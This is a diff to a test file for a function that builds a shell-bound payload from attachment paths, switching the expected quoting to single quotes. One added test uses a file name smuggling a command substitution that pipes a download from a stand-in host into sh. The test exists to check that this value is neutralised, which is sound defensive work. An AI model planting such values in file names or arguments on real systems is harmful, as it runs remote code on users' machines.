@@ -123,26 +123,38 @@ describe("buildSendPayload", () => {
         textBlocks: [],
         typed: "look",
       }),
-    ).toBe('"/Users/me/My Photos/a.png" look');
+    ).toBe("'/Users/me/My Photos/a.png' look");
   });
-  it("leaves space-free paths unquoted", () => {
+  it("leaves plain paths unquoted", () => {
     expect(
       buildSendPayload({ attachments: [img({ path: "/tmp/a.png" })], textBlocks: [], typed: "" }),
     ).toBe("/tmp/a.png");
   });
-  it("escapes embedded quotes and backslashes inside a quoted path", () => {
+  it("neutralizes shell metacharacters — this payload can reach a live shell tab", () => {
+    // `kind: "shell"` is a valid compose-box target and submitPrompt appends the carriage return
+    // itself, so a name like this used to RUN with no user Enter (roborev 54375). The rule is
+    // services/shellQuote; this asserts buildSendPayload applies it.
     expect(
       buildSendPayload({
-        attachments: [img({ path: '/tmp/a "b"/c.png' })],
+        attachments: [img({ path: "/tmp/report`curl evil.sh|sh`.png" })],
+        textBlocks: [],
+        typed: "look",
+      }),
+    ).toBe("'/tmp/report`curl evil.sh|sh`.png' look");
+  });
+  it("escapes an embedded single quote by closing, escaping and reopening", () => {
+    expect(
+      buildSendPayload({
+        attachments: [img({ path: "/tmp/don't.png" })],
         textBlocks: [],
         typed: "",
       }),
-    ).toBe('"/tmp/a \\"b\\"/c.png"');
+    ).toBe("'/tmp/don'\\''t.png'");
   });
   it("quotes a path containing a quote even with no whitespace", () => {
     expect(
       buildSendPayload({ attachments: [img({ path: '/tmp/a"b.png' })], textBlocks: [], typed: "" }),
-    ).toBe('"/tmp/a\\"b.png"');
+    ).toBe(`'/tmp/a"b.png'`);
   });
 });
 
